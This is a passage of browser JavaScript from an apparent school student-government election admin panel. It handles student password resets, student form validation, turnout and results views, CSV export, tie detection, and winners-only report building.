    input.type = isHidden ? 'text' : 'password';
    btn.classList.toggle('is-visible', isHidden);
}

// Issues a one-time temporary password (Batch B2 - password recovery
// without an email service). The clear value is shown ONCE via toast;
// only the hash is stored, and users.password_reset_pending forces the
// student through the change-password gate at their next login.
async function resetStudentPassword(){
    const confirmed = await showConfirmModal({
        title: "Reset this student's password?",
        message: `A one-time temporary password will be generated for ${studentDraft.fullName || 'this student'}. It is shown only once - write it down now. They must choose a new password at their next login.`,
        confirmLabel: 'Generate Temporary Password',
    });
    if (!confirmed) return;
    try {
        const res = await fetch(STUDENTS_API, {
            method: 'PUT',
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify({csrf_token: CSRF_TOKEN, id: studentDraft.id, resetPassword: true})
        });
        const data = await res.json();
        if (res.ok && data.success) {
            allStudentsCache = null;
            addLog(`Reset password for ${studentDraft.fullName} (${studentDraft.studentId})`);
            showToast(`Temporary password for ${studentDraft.studentId}: ${data.temp_password} - shown once.`, 'info', { duration: 30000 });
        } else {
            showToast(data.error || 'Failed to reset password.', 'error');
        }
    } catch (e) { showToast('Network error. Please try again.', 'error'); }
}
async function saveStudent(){
    // Clear any previous inline error states before re-validating.
    ['s_studentId','s_fullName','s_department','s_schoolYear','s_password','s_yearLevel','s_accountStatus'].forEach(id => {
        document.getElementById(id)?.classList.remove('field-invalid');
    });
    document.querySelectorAll('#studentFormView .field-error-msg').forEach(el => el.remove());

    const studentId = document.getElementById('s_studentId').value.trim();
    const fullName = document.getElementById('s_fullName').value.trim();
    const department = document.getElementById('s_department').value;
    const schoolYearId = document.getElementById('s_schoolYear').value;
    const email = document.getElementById('s_email').value.trim();
    const status = document.getElementById('s_status').value;
    const accountStatus = document.getElementById('s_accountStatus').value;
    const password = document.getElementById('s_password').value;

    // Inline, field-level validation: mark exactly which fields are the
    // problem instead of one generic banner the admin has to cross-reference.
    const invalidFields = [];
    if (!studentId) invalidFields.push(['s_studentId', 'Student ID is required.']);
    if (!fullName) invalidFields.push(['s_fullName', 'Full name is required.']);
    if (!department) invalidFields.push(['s_department', 'Select a faculty.']);
    if (!schoolYearId) invalidFields.push(['s_schoolYear', 'Select a school year.']);
    if (password && password.length < 6) invalidFields.push(['s_password', 'Password must be at least 6 characters.']);
    if (accountStatus !== 'normal' && !studentDraft.yearLevel) invalidFields.push(['s_yearLevel', 'Select a year level.']);
    if (accountStatus === 'normal' && schoolYearId && studentComputed().blocked) invalidFields.push(['s_accountStatus', 'Past 4 years — choose a Lifecycle Status.']);

    if (invalidFields.length) {
        invalidFields.forEach(([id, msg], i) => {
            const el = document.getElementById(id);
            if (!el) return;
            el.classList.add('field-invalid');
            const errEl = document.createElement('div');
            errEl.className = 'field-error-msg';
            errEl.textContent = msg;
            el.closest('.form-row')?.appendChild(errEl);
            if (i === 0) el.focus();
        });
        document.getElementById('studentFormError').innerHTML = `<div class="alert alert-error">Please fix the ${invalidFields.length} highlighted field${invalidFields.length===1?'':'s'} below.</div>`;
        return;
    }

    const payload = {
        csrf_token: CSRF_TOKEN,
        student_id: studentId,
        fullName, department, schoolYearId: parseInt(schoolYearId, 10), email, status, accountStatus, yearLevel: studentDraft.yearLevel
    };
    if (password) payload.password = password;
    if (studentDraft.id) payload.id = studentDraft.id;

    try {
        const method = studentDraft.id ? 'PUT' : 'POST';
        const res = await fetch(STUDENTS_API, {
            method: method,
            headers: {'Content-Type': 'application/json'},
            body: JSON.stringify(payload)
        });
        const data = await res.json();
        if (res.ok) {
            addLog(`${studentDraft.id ? 'Updated' : 'Registered'} student: ${fullName}`);
            showToast(`${studentDraft.id ? 'Student updated' : 'Student registered'}.`, 'success');
            allStudentsCache = null; // invalidate cache so the next render pulls fresh data
            cancelStudentForm();
        } else {
            document.getElementById('studentFormError').innerHTML = `<div class="alert alert-error">${escapeHtml(data.error || 'Save failed.')}</div>`;
        }
    } catch (e) {
        document.getElementById('studentFormError').innerHTML = '<div class="alert alert-error">Network error.</div>';
    }
}

// ------------------------------------------------------------------
// RESULTS PANEL (show all elections results)
// ------------------------------------------------------------------
function visibilityButtons(electionId, current){
    const opts = [
        {key:'always', label:'Show Results'},
        {key:'after', label:'Only After Election'},
        {key:'never', label:'Never Show'},
    ];
    return `<div class="pill-toggle">` + opts.map(o =>
        `<button class="${o.key===current?'selected':''}" onclick="setElectionVisibility(${electionId}, '${o.key}')">${o.label}</button>`
    ).join('') + `</div>`;
}

// Builds a CSV of every position/candidate/vote-count for one election
// (as returned by GET elections.php?id=...) and triggers a download.
function exportResultsCSV(detail){
    const positions = detail.positions || [];
    if (!positions.length) { showToast('No positions to export for this election yet.', 'warning'); return; }
    const headers = ['Position','Candidate','Department','Year Level','Party','Votes','Share of Position Votes (%)'];
    const rows = [];
    positions.forEach(pos => {
        const cands = pos.candidates || [];
        const total = cands.reduce((a,c) => a + (c.vote_count || 0), 0);
        cands.forEach(c => {
            const votes = c.vote_count || 0;
            const pct = total > 0 ? Math.round((votes/total)*100) : 0;
            rows.push([pos.title, c.name, c.department || '', c.candidate_year || '', c.party || '', votes, pct]);
        });
    });
    if (!rows.length) { showToast('No candidates to export for this election yet.', 'warning'); return; }
    downloadCSV(`${detail.name.replace(/[^a-z0-9]+/gi, '_')}_results.csv`, headers, rows);
    showToast('Results exported to CSV.', 'success');
}

// Three distinct modes, so the read-only view and the controls that change
// data are never tangled together:
//
//   'overview' charts across every election. Purely read-only — no
//              visibility pills, no edit affordances. This is the default.
//   'detail'   the tallies for one election, plus the student-visibility
//              control and the CSV export. This is where you act.
//   'reports'  winners-only documents for print / XLSX / DOC / PDF.
let resultsView = 'overview'; // 'overview' | 'detail' | 'reports'

// Chart.js instances are tracked by canvas id so a re-render can destroy
// the previous ones. Without this, every tab switch leaks a live Chart
// instance that keeps its resize listener and animation loop alive, and
// the canvas it was bound to goes stale.
const resultsCharts = {};

function destroyResultsCharts(){
    Object.keys(resultsCharts).forEach(id => {
        const c = resultsCharts[id];
        if (c) { try { c.destroy(); } catch (e) { /* already gone */ } }
        delete resultsCharts[id];
    });
}

function chartLibReady(){ return typeof Chart !== 'undefined'; }

function resultsTabBar(){
    // Each mode gets its own literal `resultsView='…'` call site rather
    // than a shared loop, so the three entry points stay greppable.
    // The "Reports & Export" entry is deliberately NOT a third pill: it is
    // the panel's export surface, so it sits alone on the right end of the
    // header row styled like every other primary action (e.g. "+ Register
    // Student"), while Overview / Election Detail are a segmented VIEW
    // switch - they change what the panel shows, so they get one joined
    // track with a filled active segment, not loose sort-style pills.
    return `
    <div class="results-tab-row" style="display:flex;align-items:center;justify-content:space-between;gap:1rem;flex-wrap:wrap;margin-bottom:1.25rem;">
        <div class="view-switch">
            <button class="${resultsView==='overview'?'selected':''}" onclick="resultsView='overview'; renderResults();">Overview</button>
            <button class="${resultsView==='detail'?'selected':''}" onclick="resultsView='detail'; renderResults();">Election Detail</button>
        </div>
        <button class="btn btn-primary${resultsView==='reports'?' reports-btn-active':''}" onclick="resultsView='reports'; renderResults();">Reports &amp; Export</button>
    </div>`;
}

// Single entry point for the panel. `focusId` is passed by the Archive tab
// to deep-link one archived election; it forces the detail view regardless
// of the current mode, since that is the only place an archived election's
// tallies and controls are shown.
async function renderResults(focusId){
    destroyResultsCharts();
    if (focusId) {
        resultsView = 'detail';
        return renderDetailView(focusId);
    }
    if (resultsView === 'reports') return renderReportsView();
    if (resultsView === 'detail')  return renderDetailView(null);
    return renderOverviewView();
}

// ------------------------------------------------------------------
// OVERVIEW — charts only, no controls
// ------------------------------------------------------------------
const CHART_COLORS = ['#84cc16','#3b82f6','#f97316','#a855f7','#ec4899','#14b8a6','#eab308','#64748b'];

// Reads the theme's text/border colors so axis labels and gridlines stay
// legible in dark mode instead of being hardcoded to dark grey.
function chartTheme(){
    const dark = document.documentElement.getAttribute('data-theme') === 'dark';
    return {
        text: dark ? '#cbd5e1' : '#475569',
        grid: dark ? 'rgba(148,163,184,.16)' : 'rgba(100,116,139,.14)',
        tooltipBg: dark ? '#1e293b' : '#0f172a',
    };
}

function chartBaseOptions(extra){
    const t = chartTheme();
    return Object.assign({
        responsive: true,
        maintainAspectRatio: false,
        animation: { duration: 400 },
        plugins: {
            legend: { labels: { color: t.text, boxWidth: 12, font: { size: 11 } } },
            tooltip: {
                backgroundColor: t.tooltipBg,
                titleFont: { size: 12 },
                bodyFont: { size: 12 },
                padding: 10,
                cornerRadius: 6,
            },
        },
        scales: {
            x: { ticks: { color: t.text, font: { size: 11 } }, grid: { color: t.grid } },
            y: { ticks: { color: t.text, font: { size: 11 } }, grid: { color: t.grid } },
        },
    }, extra || {});
}

function chartEmpty(msg){
    return `<div class="chart-empty">${escapeHtml(msg)}</div>`;
}

/**
 * Replaces a chart canvas with a message in place.
 *
 * This swaps the canvas's INNER HTML rather than replacing the canvas node
 * itself. Replacing the node would detach it, which breaks the
 * `closest('.chart-box')` lookups the other chart functions rely on and
 * leaves the container in a state that can't be re-rendered into cleanly.
 */
function chartShowEmpty(canvas, msg){
    const box = canvas.closest('.chart-box');
    if (!box) return;
    box.style.height = '';
    box.innerHTML = chartEmpty(msg);
}

async function renderOverviewView(){
    const el = document.getElementById('panel-results');
    el.innerHTML = resultsTabBar() + '<div class="skeleton skel-card" style="height:260px;"></div>';

    let allElections = [];
    try {
        const res = await fetch(ELECTIONS_API);
        allElections = await res.json();
    } catch (e) {
        el.innerHTML = resultsTabBar() + '<div class="alert alert-error">Could not load elections.</div>';
        return;
    }

    // Archived elections are historical records, not live races — the
    // Overview charts what is running. Archived tallies live in the
    // Archive tab and in Reports.
    const live = allElections.filter(e => e.status !== 'archived');
    if (!live.length) {
        el.innerHTML = resultsTabBar()
            + `<div class="card"><div class="coming-soon">No active elections yet. Charts appear here once an election exists — try the <strong>Election Detail</strong> tab for per-election data.</div></div>`;
        return;
    }

    if (!chartLibReady()) {
        el.innerHTML = resultsTabBar()
            + `<div class="card"><h2 class="section-title" style="margin-top:0;">Overview</h2>`
            + `<div class="alert alert-warning">Charts could not load — the Chart.js library didn't come through from the CDN. Everything else on this page still works; use <strong>Election Detail</strong> for the raw tallies and <strong>Reports &amp; Export</strong> for documents.</div></div>`;
        return;
    }

    let details = [];
    try {
        details = await Promise.all(live.map(e => fetch(`${ELECTIONS_API}?id=${e.id}`).then(r => r.json())));
    } catch (e) {
        el.innerHTML = resultsTabBar() + '<div class="alert alert-error">Could not load election results.</div>';
        return;
    }
    // Cache for the CSV export button on the Detail tab.
    details.forEach(d => { electionDetailsCache[d.id] = d; });

    const nArchived      = allElections.length - details.length;
    const totalPositions = details.reduce((a,d) => a + (d.positions || []).length, 0);
    const totalBallots   = details.reduce((a,d) => a + (d.ballots_cast || 0), 0);

    // A "combined turnout" across elections is NOT meaningful: a DSG ballot
    // is scoped to one faculty, so summing each election's eligible count
    // double-counts students who are eligible for several DSG elections, and
    // the numerator counts one student once per election they voted in. The
    // result was a percentage that could exceed 100% and meant nothing.
    // Turnout is therefore reported PER ELECTION (in the table below), and
    // the headline figure is participation — how many distinct people have
    // voted at least once — which is well defined.

    // Distinct people who have voted in at least one active election. Computed
    // from each election's own ballots, de-duplicated client-side is not
    // possible (the API returns a count, not the ids), so the server-side
    // distinct figure is requested per election and we take the MAX as a
    // lower bound: any voter of N elections is counted N times, so the
    // honest headline is the largest single-election turnout.
    const anyVoted = details.filter(d => (d.ballots_cast || 0) > 0).length;
    const bestTurnout = details.reduce((best, d) =>
        (d.turnout_pct || 0) > (best.turnout_pct || 0) ? d : best, details[0]);

    const votesCasted   = totalBallots > 0;
    const turnoutTone   = !votesCasted ? 'tone-neutral'
                        : (bestTurnout && bestTurnout.turnout_pct < 30 ? 'tone-warn' : 'tone-good');

    const strip = `
    <div class="stat-strip">
        <div class="stat-tile tone-neutral">
            <div class="k">Elections open now</div>
            <div class="v">${details.length}</div>
            <div class="s">${details.length === 1 ? 'One election' : `${details.length} elections`} accepting votes</div>
            <div class="hint">${nArchived ? `${nArchived} archived ${nArchived===1?'election':'elections'} hidden from this view` : 'Nothing archived yet'}</div>
        </div>
        <div class="stat-tile tone-neutral">
            <div class="k">Positions on the ballot</div>
            <div class="v">${totalPositions}</div>
            <div class="s">Across ${details.length === 1 ? 'this election' : 'these elections'}</div>
            <div class="hint">Each position has its own winner; see <strong>Election Detail</strong> for candidates</div>
        </div>
        <div class="stat-tile tone-neutral">
            <div class="k">Ballots recorded</div>
            <div class="v">${totalBallots}</div>
            <div class="s">${anyVoted ? `In ${anyVoted} of ${details.length} elections` : 'No ballots yet'}</div>
            <div class="hint">One ballot per person per election, not one per vote cast</div>
        </div>
        <div class="stat-tile ${turnoutTone}">
            <div class="k">Best turnout so far</div>
            <div class="v">${bestTurnout ? (bestTurnout.turnout_pct || 0) : 0}%</div>
            <div class="s">${bestTurnout ? escapeHtml(shortName(bestTurnout.name, 28)) : '—'}</div>
            <div class="hint">Highest of any open election. Turnout differs per faculty, so it is not added up</div>
        </div>
    </div>`;

    // ---- Per-election summary table: the actual "outside" view ----------
    const rows = details.map(d => {
        const pct = d.turnout_pct || 0;
        const positions = d.positions || [];
        const decided = positions.filter(p => (p.candidates || []).some(c => (c.vote_count || 0) > 0)).length;
        const ties = positions.filter(p => computeWinners(p).tie).length;
        const meterCls = pct === 0 ? 'none' : pct < 30 ? 'low' : '';
        return `
        <tr>
            <td>
                <span class="ov-name">${escapeHtml(d.name)}</span>
                <span class="ov-sub">${d.type === 'DSG' ? escapeHtml(d.department || 'No faculty set') : 'School-wide (SSG)'}${d.target_school_year_label ? ' · SY ' + escapeHtml(d.target_school_year_label) : ''}</span>
            </td>
            <td><span class="status-large ${statusClass(d.status)}" style="transform:scale(.85);display:inline-flex;"><span class="status-dot"></span>${statusLabel(d.status)}</span></td>
            <td class="num">${d.ballots_cast || 0} / ${d.eligible_voters || 0}</td>
            <td>
                <div class="meter">
                    <div class="meter-track"><div class="meter-fill ${meterCls}" style="width:${Math.max(0, Math.min(100, pct))}%"></div></div>
                    <span class="meter-label">${pct}%</span>
                </div>
            </td>
            <td class="num">${decided} / ${positions.length}${ties ? ` <span class="status-pill suspended">${ties} tied</span>` : ''}</td>
            <td class="num"><button class="btn btn-secondary btn-sm" onclick="resultsView='detail'; renderResults(${d.id});">View</button></td>
        </tr>`;
    }).join('');

    const table = `
    <div class="chart-card span-full">
        <div class="chart-card-head"><h3 class="chart-card-title">Each open election at a glance</h3></div>
        <p class="chart-card-sub">One row per election. "Ballots" counts people who voted against the students eligible in that election's own scope.</p>
        <div style="overflow-x:auto;">
        <table class="ov-table">
            <thead><tr>
                <th>Election</th><th>Status</th><th class="num">Ballots</th><th>Turnout</th><th class="num">Positions decided</th><th></th>
            </tr></thead>
            <tbody>${rows}</tbody>
        </table>
        </div>
    </div>`;

    // ---- What needs a human decision ------------------------------------
    const flags = [];
    details.forEach(d => {
        (d.positions || []).forEach(p => {
            const w = computeWinners(p);
            if (w.tie) {
                flags.push({
                    tone: 'warn', icon: '⚠',
                    text: `<strong>${escapeHtml(d.name)}</strong> — "${escapeHtml(p.title)}" is tied at ${w.cutoffVotes} vote${w.cutoffVotes===1?'':'s'}. There is no winner until you break the tie.`,
                });
            }
        });
        const anyVotes = (d.positions || []).some(p => (p.candidates || []).some(c => (c.vote_count || 0) > 0));
        if (!anyVotes) {
            flags.push({
                tone: 'info', icon: '○',
                text: `<strong>${escapeHtml(d.name)}</strong> has no ballots yet${d.status === 'scheduled' ? ' — it has not opened for voting' : ''}.`,
            });
        }
    });

    const flagsHtml = flags.length ? `
    <div class="chart-card span-full">
        <div class="chart-card-head"><h3 class="chart-card-title">Needs your attention</h3></div>
        <p class="chart-card-sub">Things the numbers above cannot resolve on their own.</p>
        <div class="ov-flags">
            ${flags.slice(0, 8).map(f => `<div class="ov-flag ${f.tone}"><span class="flag-icon">${f.icon}</span><span>${f.text}</span></div>`).join('')}
        </div>
        ${flags.length > 8 ? `<p class="chart-legend-note">+ ${flags.length - 8} more</p>` : ''}
    </div>` : '';

    el.innerHTML = resultsTabBar() + `
    <div class="card" style="margin-bottom:1.25rem;">
        <h2 class="section-title" style="margin-top:0;">Overview</h2>
        <p class="muted" style="margin-top:-.5rem;">The state of every open election at a glance. Candidate-level tallies and controls live in <strong>Election Detail</strong>.</p>
    </div>
    ${strip}
    <div class="chart-grid">
        ${table}
        ${flagsHtml}
    </div>`;

}

// Truncates a long election name for a tile, without cutting mid-word when
// possible.
function shortName(name, max){
    const s = String(name || '');
    if (s.length <= max) return s;
    const cut = s.slice(0, max);
    const sp = cut.lastIndexOf(' ');
    return (sp > max * 0.6 ? cut.slice(0, sp) : cut) + '…';
}

// ------------------------------------------------------------------
// ELECTION DETAIL — the tallies, plus the controls that change something
// ------------------------------------------------------------------
async function renderDetailView(focusId){
    const el = document.getElementById('panel-results');

    el.innerHTML = `
        <div class="skeleton skel-line w40" style="height:16px;"></div>
        ${'<div class="skeleton skel-card"></div>'.repeat(2)}
    `;
    try {
        const res = await fetch(ELECTIONS_API);
        const allElections = await res.json();
        // Archived elections don't clutter the general Results view — view
        // their results from the Archive tab instead (same underlying data,
        // just scoped to one election via focusId below).
        const elections = focusId
            ? allElections.filter(e => String(e.id) === String(focusId))
            : allElections.filter(e => e.status !== 'archived');

        let html = (!focusId ? resultsTabBar() : '') + '<p class="muted" style="margin-top:0;">Admins can always see live results here, regardless of the student-facing visibility setting.</p>';
        if (focusId) {
            html = `<button class="btn btn-secondary btn-sm" onclick="resultsView='detail'; renderResults()">&larr; Back to all results</button>` + html;
        }

        if (!elections.length) {
            html += `<div class="coming-soon">${focusId ? 'That election could not be found.' : 'No elections yet.'}</div>`;
        } else {
            const details = await Promise.all(elections.map(e => fetch(`${ELECTIONS_API}?id=${e.id}`).then(r => r.json())));

            details.forEach(detail => {
                // Populate the cache in the same pass that builds the markup,
                // so the CSV button below can never render before its data
                // exists. (It previously depended on this loop having run.)
                electionDetailsCache[detail.id] = detail;
                const visibleToStudents = detail.results_visibility === 'always'
                    || (detail.results_visibility === 'after' && (detail.status === 'closed' || detail.status === 'archived'));

                // Per-election figures. Each one states what it counts, and the
                // turnout tile says WHICH population the denominator is — a
                // DSG election is only open to its own faculty, so "0 of 2
                // eligible" is only meaningful next to that fact.
                const scope = detail.type === 'DSG'
                    ? `${detail.department || 'this faculty'} students`
                    : 'all active students school-wide';
                const posList = detail.positions || [];
                const decidedCount = posList.filter(p => (p.candidates||[]).some(c => (c.vote_count||0) > 0)).length;
                const tieCount = posList.filter(p => computeWinners(p).tie).length;
                const turnoutPct = detail.turnout_pct || 0;
                const meterCls = turnoutPct === 0 ? 'none' : turnoutPct < 30 ? 'low' : '';
                const turnoutTone = turnoutPct === 0 ? 'tone-neutral' : turnoutPct < 30 ? 'tone-warn' : 'tone-good';

                const figures = `
                <div class="stat-strip" style="margin-top:1rem;margin-bottom:0;">
                    <div class="stat-tile ${turnoutTone}">
                        <div class="k">Turnout</div>
                        <div class="v">${turnoutPct}%</div>
                        <div class="s">${detail.ballots_cast || 0} of ${detail.eligible_voters || 0} people voted</div>
                        <div class="hint">Eligible means ${escapeHtml(scope)}</div>
                    </div>
                    <div class="stat-tile tone-neutral">
                        <div class="k">Positions</div>
                        <div class="v">${posList.length}</div>
                        <div class="s">${decidedCount} ${decidedCount === 1 ? 'has' : 'have'} votes recorded</div>
                        <div class="hint">${tieCount ? `${tieCount} tied — needs a manual decision` : 'No ties'}</div>
                    </div>
                    <div class="stat-tile tone-neutral">
                        <div class="k">Votes cast</div>
                        <div class="v">${detail.vote_count || 0}</div>
                        <div class="s">Across all ${posList.length} positions</div>
                        <div class="hint">One vote per person per position, so this is larger than the ballot count</div>
                    </div>
                </div>`;

                html += `
                <div class="card results-block">
                    <div class="rm-head">
                        <div>
                            <h3 style="margin:0;">${escapeHtml(detail.name)}</h3>
                            <span class="status-large ${statusClass(detail.status)}" style="margin-top:.4rem;"><span class="status-dot"></span>${statusLabel(detail.status)}</span>
                            ${syBadgeHtml(detail.target_school_year_label)}
                        </div>
                        <button class="btn btn-secondary btn-sm" onclick="exportResultsCSV(electionDetailsCache[${detail.id}])">⬇ Export CSV</button>
                    </div>
                    ${figures}
                    <div class="results-visibility-row" style="margin-top:1rem;">
                        <span class="vis-label">Student visibility:</span>
                        ${visibilityButtons(detail.id, detail.results_visibility)}
                        <span class="muted" style="font-size:.78rem;">${visibleToStudents ? '(currently visible to students)' : '(currently hidden from students)'}</span>
                    </div>
                    <hr style="border:none;border-top:1px solid var(--line);margin:1rem 0;">`;

                const positions = detail.positions || [];
                if (!positions.length) {
                    html += '<p class="muted">No positions set up yet.</p>';
                }

                // This is the "inside" view — the per-candidate bar chart
                // that used to sit on the Overview. Rendered into a
                // dedicated container per election and drawn after the HTML
                // lands, so Chart.js sizes against a canvas that is already
                // in the document.
                positions.forEach((pos, posIdx) => {
                    const cands = pos.candidates || [];
                    const total = cands.reduce((a,c) => a + (c.vote_count || 0), 0);
                    const yearNote = pos.year_restriction ? ` <span class="muted" style="font-size:.75rem;font-weight:400;">— visible only to ${escapeHtml(pos.year_restriction)}</span>` : '';
                    const tie = computeWinners(pos).tie;
                    const uncontested = cands.length === 1;
                    const topVotes = cands.length ? Math.max(...cands.map(c => c.vote_count || 0)) : 0;
                    const leaders = cands.filter(c => (c.vote_count || 0) === topVotes && topVotes > 0);
                    const seats = pos.winner_count || 1;

                    html += `<div style="margin-bottom:1.5rem;">
                        <div class="report-row" style="padding-top:0;border-bottom:none;">
                            <h4 style="margin:0;font-size:.95rem;">${escapeHtml(pos.title)}${yearNote}</h4>
                            <span class="muted" style="font-size:.76rem;">
                                ${total} vote${total===1?'':'s'} cast · ${seats > 1 ? `${seats} winner${seats===1?'':'s'}` : '1 winner'}
                                ${tie ? ' · <span class="status-pill suspended">TIE</span>' : ''}
                                ${uncontested ? ' · <span class="status-pill normal">UNCONTESTED</span>' : ''}
                            </span>
                        </div>`;

                    if (!cands.length) {
                        html += '<p class="muted">No candidates on this position.</p>';
                    } else {
                        // No per-position chart here. The rows above already
                        // carry every candidate's count, share and progress
                        // bar, so a chart directly beneath them restates the
                        // same numbers for ~150px of vertical space. Charts
                        // are reserved for the Overview, where they compare
                        // things a list of rows cannot.
                        cands.forEach(c => {
                            const votes = c.vote_count || 0;
                            const pct = total > 0 ? Math.round((votes/total)*100) : 0;
                            const isLeader = topVotes > 0 && votes === topVotes;
                            const candMeta = [c.department, c.candidate_year].filter(Boolean).join(' · ');
                            html += `
                            <div class="result-row">
                                <div class="result-header">
                                    <span>${isLeader ? '<span style="color:var(--lime-dark);font-weight:700;" title="Currently leading">&#9733;</span> ' : ''}${escapeHtml(c.name)} ${c.party && c.party !== 'No Party / Independent' ? `<span class="muted">· ${escapeHtml(c.party)}</span>` : ''}</span>
                                    <span>${votes} vote${votes===1?'':'s'} (${pct}%)</span>
                                </div>
                                ${candMeta ? `<div class="muted" style="font-size:.76rem;margin-top:.1rem;">${escapeHtml(candMeta)}</div>` : ''}
                                <div class="progress-bar-track"><div class="progress-bar-fill" style="width:${pct}%;"></div></div>
                            </div>`;
                        });
                        if (uncontested) {
                            html += '<p class="chart-legend-note">Uncontested — only one candidate stood.</p>';
                        }
                    }
                    html += '</div>';
                });

                html += '</div>';
            });
        }

        el.innerHTML = html;
    } catch (e) {
        el.innerHTML = '<div class="alert alert-error">Could not load results.</div>';
      }
  }

// ------------------------------------------------------------------
// REPORTS — winners-only SSG/DSG reports, grouped by an election's
// target_school_year (who these officers will actually serve — NOT the
// raw election dates, since an election held during 2026-2027 is
// normally FOR 2027-2028). Print preview opens a clean new tab; Export
// buttons produce a real .xlsx (via SheetJS, loaded in <head>) and a
// Word-openable .doc (an HTML document served with the Word MIME type —
// no library needed, and Word opens it natively).
// ------------------------------------------------------------------
let reportType = 'SSG'; // 'SSG' | 'DSG'
let reportTargetSchoolYearId = null;

// Sorts candidates by votes desc, takes the top winner_count as winners,
// and flags a tie when the candidate just outside the cutoff has the
// same vote count as the last winner — that's a real ambiguity an admin
// needs to resolve by hand, not something to silently pick a winner for.
function computeWinners(position){
    const cands = (position.candidates || []).slice().sort((a,b) => (b.vote_count||0) - (a.vote_count||0));
    const winnerCount = position.winner_count || 1;
    if (!cands.length) return { winners: [], tie: false, cutoffVotes: 0 };
    // Zero votes cast (or an election that hasn't ended): naming the
    // first N candidates as "winners" would print people as elected
    // who never were. Report "no votes cast" instead.
    const totalVotes = cands.reduce((a,c) => a + (c.vote_count||0), 0);
    if (!totalVotes) return { winners: [], tie: false, cutoffVotes: 0, noVotes: true };
    const cutoffIdx = Math.min(winnerCount, cands.length) - 1;
    const cutoffVotes = cands[cutoffIdx].vote_count || 0;
    const winners = cands.slice(0, winnerCount);
    const nextOutside = cands[winnerCount];
    const tie = !!nextOutside && (nextOutside.vote_count || 0) === cutoffVotes && cutoffVotes > 0;
    return { winners, tie, cutoffVotes };
}

// Builds the report's section list from a set of full election details
// (as returned by ELECTIONS_API?id=X). One section per election, so a
// DSG report naturally reads as "one block per faculty".
function buildReportSections(details){
    return details.map(detail => ({
        heading: detail.type === 'DSG' ? `${detail.department || 'Faculty'} — ${detail.name}` : detail.name,
        electionName: detail.name,
        positions: (detail.positions || []).map(p => {
            const { winners, tie, noVotes } = computeWinners(p);
            // noVotes distinguishes "candidates got zero votes" from "no
            // candidates at all" — both yield empty winners, but the report
            // must not tell the admin a position had no candidates when it
            // simply had no votes.
            return { title: p.title, winners, tie, noVotes: !!noVotes };
        }),
    }));
}

async function renderReportsView(){
    destroyResultsCharts();
    const el = document.getElementById('panel-results');
    el.innerHTML = resultsTabBar() + '<div class="skeleton skel-card" style="height:220px;"></div>';

    await loadSettingsData();
    if (reportTargetSchoolYearId === null) {
        // Default to the school year these elections SERVE (the next one) —
        // "an election held during 2026-2027 is normally FOR 2027-2028".
        // String() on both sides: the settings API returns start_year as a
        // string and the client helper returns a number, so a bare ===
        // never matched and the report silently defaulted to 2023-2024
        // via the [0] fallback — showing "no elections" until the admin
        // picked the right year by hand.
        reportTargetSchoolYearId = (schoolYearOptions.find(sy => String(sy.start_year) === String(nextSchoolYearStartYearClient())) || schoolYearOptions[0] || {}).id || null;
    }

    let allElections = [];
    try {
        const res = await fetch(ELECTIONS_API);
        allElections = await res.json();
    } catch (e) {
        el.innerHTML = resultsTabBar() + '<div class="alert alert-error">Could not load elections.</div>';
        return;
    }

    const syOptionsSorted = schoolYearOptions.slice().sort((a,b) => b.start_year - a.start_year);
    const matching = allElections.filter(e => e.type === reportType && String(e.target_school_year_id) === String(reportTargetSchoolYearId));

    const typePills = `
        <div class="pill-toggle" style="margin-bottom:1rem;">
            <button class="${reportType==='SSG'?'selected':''}" onclick="reportType='SSG'; renderReportsView();">SSG Report</button>
            <button class="${reportType==='DSG'?'selected':''}" onclick="reportType='DSG'; renderReportsView();">DSG Report (All Faculties)</button>
        </div>`;

    const yearPicker = `
        <div class="form-row" style="max-width:280px;margin-bottom:1.25rem;">
            <label>For School Year</label>
            <select onchange="reportTargetSchoolYearId=this.value?parseInt(this.value):null; renderReportsView();">
                ${syOptionsSorted.map(sy => `<option value="${sy.id}" ${String(reportTargetSchoolYearId)===String(sy.id)?'selected':''}>${escapeHtml(sy.label)}</option>`).join('')}
            </select>
        </div>`;

    const listHtml = matching.length
        ? `<ul class="insight-list">${matching.map(e => `<li>${escapeHtml(e.name)}${e.type==='DSG' ? ' — ' + escapeHtml(e.department||'') : ''} <span class="status-large ${statusClass(e.status)}" style="transform:scale(.8);display:inline-flex;"><span class="status-dot"></span>${statusLabel(e.status)}</span></li>`).join('')}</ul>`
        : `<p class="muted">No ${reportType} elections are targeted at this school year yet.</p>`;

    el.innerHTML = `
        ${resultsTabBar()}
        <div class="card">
            <h2 class="section-title" style="margin-top:0;">Reports</h2>
            <p class="muted" style="margin-top:-0.5rem;">Winners-only report for print or download. Grouped by which school year these officers actually serve, not when the election was held.</p>
            ${typePills}
            ${yearPicker}
            <h3 style="font-size:.9rem;margin:0 0 .5rem;">Included in this report</h3>
            ${listHtml}
            <div class="card-actions" style="margin-top:1.25rem;">
                <button class="btn btn-primary" ${!matching.length?'disabled':''} onclick="generateReport()">Generate Report</button>
            </div>
        </div>
        <div id="reportPreviewArea" class="report-preview" style="margin-top:1.5rem;"></div>
    `;
}

let lastReportData = null; // { type, schoolYearLabel, sections, order, selected } — reused by print/export buttons

// The one source of truth for what a report contains: the CHECKED sections,
// in the order the admin arranged them. Preview, print, PDF, XLSX and DOC
// all read this, so what the admin sees is exactly what every export holds.
function reportSectionsForExport(){
    if (!lastReportData) return [];
    return lastReportData.order
        .filter(i => lastReportData.selected[i])
        .map(i => lastReportData.sections[i]);
}

function toggleAllReportSections(on){
    if (!lastReportData) return;
    lastReportData.selected = lastReportData.sections.map(() => on);
    renderReportPreview();
}

function toggleReportSection(i, on){
    if (!lastReportData) return;
    lastReportData.selected[i] = on;
    renderReportPreview();
}

function moveReportSection(i, dir){
    if (!lastReportData) return;
    const order = lastReportData.order;
    const at = order.indexOf(i);
    const to = at + dir;
    if (at < 0 || to < 0 || to >= order.length) return;
    [order[at], order[to]] = [order[to], order[at]];
    renderReportPreview();
}

// Drag-commit for the report picker: the shared attachRowDrag helper moves
// the row live in the DOM; on release we read back the resulting order.
function commitReportDragOrder(){
    const listEl = document.getElementById('reportSectionList');
    if (!listEl || !lastReportData) return;
    lastReportData.order = Array.from(listEl.querySelectorAll('.report-section-row'))
        .map(r => parseInt(r.dataset.idx, 10));
    renderReportPreview();
}

function bindReportSectionDrag(){
    const listEl = document.getElementById('reportSectionList');
    if (!listEl) return;
    listEl.querySelectorAll('.report-section-row').forEach(row => {
        const handle = row.querySelector('.drag-handle');
        if (handle) attachRowDrag(handle, row, listEl, commitReportDragOrder);
    });
}

